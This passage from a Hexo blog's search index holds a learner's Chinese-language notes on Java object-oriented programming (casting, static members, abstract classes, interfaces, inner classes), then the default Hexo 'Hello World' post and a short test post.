class="hljs-comment">//编译报错（Person和String是同级的）</span><br></code></pre></td></tr></table></figure></li><li><p>强制转化</p><p>在Person类里面有run（父）<br>在Student类里面有go（子）<br>想要  对象  调用go就要   Perso类型强制转化为Student类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//类型之间的转化： 父  子</span><br>        <span class="hljs-comment">//高                低</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        <span class="hljs-comment">//student将这个对象转换为Student类型，我们就可以使用Student类型的方法了！</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> (Student) obj;<br>        student.go();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">(Student) obj.go();<span class="hljs-comment">//或者直接这样</span><br></code></pre></td></tr></table></figure></li></ul><p>总结：</p><ol><li>父类引用指向子类的对象</li><li>把子类转换为父类，向上转型（子类的方法可能会部分丢失）</li><li>把父类转换为子类，向下转型:强制转换</li><li>方便方法调用，减少重复代码</li></ol><ul><li>向上转型，这让代码更灵活（比如用父类作为方法参数，兼容所有子类）</li><li>向下转型为了突破父类引用的限制，访问子类特有的功能</li></ul><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>()&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> string name;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">go</span><span class="hljs-params">()</span>&#123;<br>        <br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>静态方法和非静态方法</p><ul><li><p>静态</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">Student<span class="hljs-selector-class">.go</span>();<br>或者<br><span class="hljs-built_in">go</span>();<br></code></pre></td></tr></table></figure></li><li><p>非静态</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Student <span class="hljs-attribute">s1</span>=new Student;<br>s1.<span class="hljs-built_in">run</span>();<br></code></pre></td></tr></table></figure></li></ul></li><li><p>看静态属性和非静态属性</p><ul><li><p>静态属性</p><p>可以作为类变量调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(Student.age);<br><span class="hljs-comment">//name就不行</span><br></code></pre></td></tr></table></figure></li><li><p>属性</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Student s1=<span class="hljs-built_in">new</span> Student;<br>//这俩都能通过对象访问<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(s1.age);<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(s1.name);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>匿名代码块（啥也没，就俩大括号）</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;</span><br><span class="hljs-template-variable">&#125;</span><br></code></pre></td></tr></table></figure></li><li><p>静态代码块·（<strong>只执行一次</strong>）</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">static</span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>最早输出的是：   静态代码块—匿名代码块—构造方法</p><p>第二次输出：匿名代码块—构造方法</p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><ul><li><p>abstract</p><p>空着，先不写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//abstract 抽象类：</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-comment">//约束~有人帮我们实现~</span><br>    <span class="hljs-comment">//abstract ，抽象方法，只有方法名字，没有方法的实现！</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>继承抽象类 需要重写抽象方法</p></li><li><p>总结：</p><ol><li>不能new这个抽象类，只能靠子类去实现它：约束!（强制重写）</li><li>抽象类中可以写普通的方法</li><li>抽象方法必须在抽象类中</li></ol></li></ul><p>用于处理 <strong>一组具有共性但实现不同的事物</strong>，减少代码量（比如动物的叫声）</p><p>（针对用途）对比重写和抽象：</p><ul><li>重写：是实现抽象约束的核心手段，但是普通方法是“可选性”重写</li><li>抽象：抽象类的抽象方法强制要求必须重写</li></ul><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125615305.png" alt="image-20251025193727309"></p><p>​类        抽象类        接口</p><ul><li><p>接口:只有规范!自己无法写方法~专业的约束!约束和实现分离:面向接口编程</p><p><strong>接口的本质是契约</strong>（就像我们人间的法律一样。制定好后大家都遵守）</p></li><li><p>多用接口，少用重写：</p><p>原因：接口可以多继承，重写单继承（excends）</p></li><li><p>interface定义关键字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//interface 定义的关键字， 接口都需要有实现类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-comment">//接口中的所有定义其实都是抽象的 public abstract（因为默认，所以隐藏了）</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(String name)</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String name)</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-symbol">TimeService</span> &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>接口要有实现类  implements（关键词）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.demo09;<br><br><span class="hljs-comment">// 抽象类： extends~</span><br><span class="hljs-comment">// 类 可以实现接口 implements 接口</span><br><span class="hljs-comment">// 实现了接口的类，就需要重写接口中的方法~</span><br><br><span class="hljs-comment">// 多继承~利用接口实现多继承~</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>, TimeService &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(String name)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String name)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">timer</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>作用：</p><ol><li>约束</li><li>定义一些方法，让不同的人实现    10——-1</li><li>public abstract    （）</li><li>public static final    （常量）</li><li>接口不能被实例化<del>，接口中没有构造方法</del></li><li>implements可以实现多个接日</li><li>必须要重写接口中的方法~</li></ol><h2 id="内部类（选）"><a href="#内部类（选）" class="headerlink" title="内部类（选）"></a>内部类（选）</h2><ul><li><p>成员内部类</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125618721.png" alt="image-20251025201724763"></p><p>而且，可以通过<strong>内部类</strong>来获得<strong>外部类的私有属性</strong>（private）</p><p>但是，如果在内部类上加static，就访问不了私有属性</p><p>因为：先实例化static内部类，才有外部类实例化，static内部类直接运行调用不到私有属性</p></li><li><p>两个类可以在一个文件里面（不是互相包含的）</p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125623584.png" alt="image-20251025202950608" style="zoom:33%;" /><p>一个文件只能有一个public class</p></li><li><p>局部内部类</p><p>方法里 写类</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125625249.png" alt="image-20251025203107344"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/12/22/hello-world/"/>
    <url>/2024/12/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><img src="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png" class="" title="图片引用方法一">]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
